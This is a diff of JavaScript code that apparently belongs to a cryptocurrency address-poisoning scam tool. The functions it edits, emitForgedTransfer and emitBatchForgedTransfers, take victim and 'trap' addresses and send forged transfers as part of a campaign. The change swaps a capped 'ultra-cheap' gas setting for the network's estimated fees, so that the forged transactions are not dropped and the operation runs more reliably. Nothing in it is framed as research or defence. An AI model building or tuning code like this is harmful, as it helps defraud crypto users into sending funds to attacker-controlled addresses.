@@ -1049,23 +1049,20 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ULTRA-CHEAP GAS: 0.02 gwei tip, low ceiling to pass balance checks
-    let maxFeePerGas = 500000000n; // 0.5 gwei ceiling (Requires very little ETH in wallet to pass pre-checks)
-    let maxPriorityFeePerGas = 20000000n; // 🚀 Exactly 0.02 gwei tip
+    // 🚀 SMART GAS: 0.02 gwei tip, dynamic ceiling to prevent dropped transactions
+    let maxPriorityFeePerGas = 20000000n; // 🚀 STRICTLY 0.02 gwei tip (This is the only extra you pay)
+    let maxFeePerGas = 3000000000n; // 3 gwei safe fallback ceiling
 
     try {
       const feeData = await client.estimateFeesPerGas();
 
-      let networkMaxFee = feeData.maxFeePerGas || 0n;
-      let networkTip = feeData.maxPriorityFeePerGas || 0n;
-
-      // If RPC returns garbage, ignore it and use our ultra-cheap defaults
-      if (networkTip >= networkMaxFee || networkMaxFee < 100000000n) {
-        logger.debug(`[mirror] RPC returned glitchy fees. Using ultra-cheap defaults.`);
+      if (feeData.maxFeePerGas && feeData.maxFeePerGas > 100000000n) {
+        // 🚀 CRITICAL: Do NOT cap the maxFeePerGas! 
+        // If the network base fee is 2 gwei and we cap at 1 gwei, it gets stuck in mempool and dropped.
+        // You ONLY pay the actual base fee anyway, so a higher ceiling costs you $0 extra.
+        maxFeePerGas = feeData.maxFeePerGas;
       } else {
-        // Use network data, but hard-cap maxFee at 1 gwei to prevent balance errors, and tip at exactly 0.02 gwei
-        maxFeePerGas = networkMaxFee < 1000000000n ? networkMaxFee : 1000000000n; // Max 1 gwei ceiling
-        maxPriorityFeePerGas = 20000000n; // Strictly 0.02 gwei tip
+        logger.debug(`[mirror] RPC returned glitchy fees. Using 3 gwei fallback ceiling.`);
       }
     } catch (e) {
       logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
@@ -1343,27 +1340,26 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ULTRA-CHEAP GAS: 0.02 gwei tip, low ceiling to pass balance checks
-    let maxFeePerGas = 500000000n; // 0.5 gwei ceiling (Requires very little ETH in wallet to pass pre-checks)
-    let maxPriorityFeePerGas = 20000000n; // 🚀 Exactly 0.02 gwei tip
+    // 🚀 SMART GAS: 0.02 gwei tip, dynamic ceiling to prevent dropped transactions
+    let maxPriorityFeePerGas = 20000000n; // 🚀 STRICTLY 0.02 gwei tip (This is the only extra you pay)
+    let maxFeePerGas = 3000000000n; // 3 gwei safe fallback ceiling
 
     try {
       const feeData = await client.estimateFeesPerGas();
 
-      let networkMaxFee = feeData.maxFeePerGas || 0n;
-      let networkTip = feeData.maxPriorityFeePerGas || 0n;
-
-      if (networkTip >= networkMaxFee || networkMaxFee < 100000000n) {
-        logger.debug(`[batch] RPC returned glitchy fees. Using ultra-cheap defaults.`);
+      if (feeData.maxFeePerGas && feeData.maxFeePerGas > 100000000n) {
+        // 🚀 CRITICAL: Do NOT cap the maxFeePerGas! 
+        // If the network base fee is 2 gwei and we cap at 1 gwei, it gets stuck in mempool and dropped.
+        // You ONLY pay the actual base fee anyway, so a higher ceiling costs you $0 extra.
+        maxFeePerGas = feeData.maxFeePerGas;
       } else {
-        // Use network data, but hard-cap maxFee at 1 gwei to prevent balance errors, and tip at exactly 0.02 gwei
-        maxFeePerGas = networkMaxFee < 1000000000n ? networkMaxFee : 1000000000n; // Max 1 gwei ceiling
-        maxPriorityFeePerGas = 20000000n; // Strictly 0.02 gwei tip
+        logger.debug(`[batch] RPC returned glitchy fees. Using 3 gwei fallback ceiling.`);
       }
     } catch (e) {
       logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
+    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
     if (maxPriorityFeePerGas >= maxFeePerGas) {
       maxPriorityFeePerGas = maxFeePerGas / 2n;
     }
